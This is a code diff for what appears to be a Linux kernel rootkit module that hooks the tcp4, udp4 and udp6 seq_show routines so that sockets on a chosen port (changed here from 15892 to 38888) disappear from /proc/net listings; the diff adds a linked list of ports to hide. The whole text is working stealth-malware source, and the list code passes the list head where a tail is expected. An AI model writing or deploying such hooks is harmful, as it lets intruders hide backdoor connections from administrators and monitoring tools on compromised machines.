@@ -5,13 +5,19 @@
 
 #include "common.h"
 #include "hook.h"
+#include "sockhide.h"
 
-#define SIZE_PORT_COLON 6
+port_list_t hidden_ports = {
+    .port  = -1,
+    .proto = -1,
+    .prev = NULL,
+    .next = NULL,
+};
 
-typedef unsigned short port_t;
+port_list_t_ptr hidden_ports_tail = &hidden_ports;
 
 //TODO add list with [PROTO:PORT] structs
-static port_t to_hide = 15892;
+static port_t to_hide = 38888;
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
@@ -71,6 +77,77 @@ unhook_show(void)
     enable_protection();
 }
 
+void 
+hide_port(port_t port, proto proto)
+{
+    add_port_to_list(&hidden_ports, port, proto);
+}
+
+void
+unhide_port(port_t port, proto proto)
+{
+    remove_port_from_list(&hidden_ports, port, proto);
+}
+
+bool
+list_contains_port(port_list_t_ptr list, port_t port, proto proto)
+{
+    return !!find_port_in_list(list, port, proto);
+}
+
+port_list_t_ptr
+find_port_in_list(port_list_t_ptr head, port_t port, proto proto)
+{
+    port_list_t_ptr i;
+    for (i = head; i; i = i->next)
+        if (i->port == port && i->proto == proto)
+            return i;
+
+    return NULL;
+}
+
+port_list_t_ptr
+add_port_to_list(port_list_t_ptr tail, port_t port, proto proto)
+{
+    port_list_t_ptr node;
+    node = (port_list_t_ptr)kmalloc(sizeof(port_list_t), GFP_KERNEL);
+
+    if (node) {
+        node->port = port;
+        node->proto = proto;
+        node->next = NULL;
+        node->prev = tail;
+        tail->next = node;
+        hidden_ports_tail = node;
+        return node;
+    }
+
+    return NULL;
+}
+
+port_list_t_ptr
+remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
+{
+    port_list_t_ptr i = find_port_in_list(list, port, proto), ret = NULL;
+
+    if (i && (i->port != -1 && i->proto != -1)) {
+        if (i->next)
+            i->next->prev = i->prev;
+        else
+            hidden_ports_tail = i->prev ? i->prev : &hidden_ports;
+
+        if (i->prev) {
+            i->prev->next = i->next;
+            ret = i->prev;
+        }
+
+        kfree(i);
+    }
+
+    return ret;
+}
+
+
 //seq and v include all the info we need
 //https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
 //https://elixir.bootlin.com/linux/v4.19/source/net/ipv4/tcp_ipv4.c#L2385
@@ -127,7 +204,7 @@ g7_udp4_seq_show(struct seq_file *seq, void *v)
 
     if(src == to_hide || dst == to_hide)
         return 0;
-    
+
     return udp4_seq_show(seq, v);
 }
 
@@ -143,8 +220,8 @@ g7_udp6_seq_show(struct seq_file *seq, void *v)
     port_t src = ntohs(inet->inet_sport);
     port_t dst = ntohs(inet->inet_dport);
 
-    if(src == to_hide || dst == to_hide)
+   if(src == to_hide || dst == to_hide)
         return 0;
-    
+
     return udp6_seq_show(seq, v);
 }
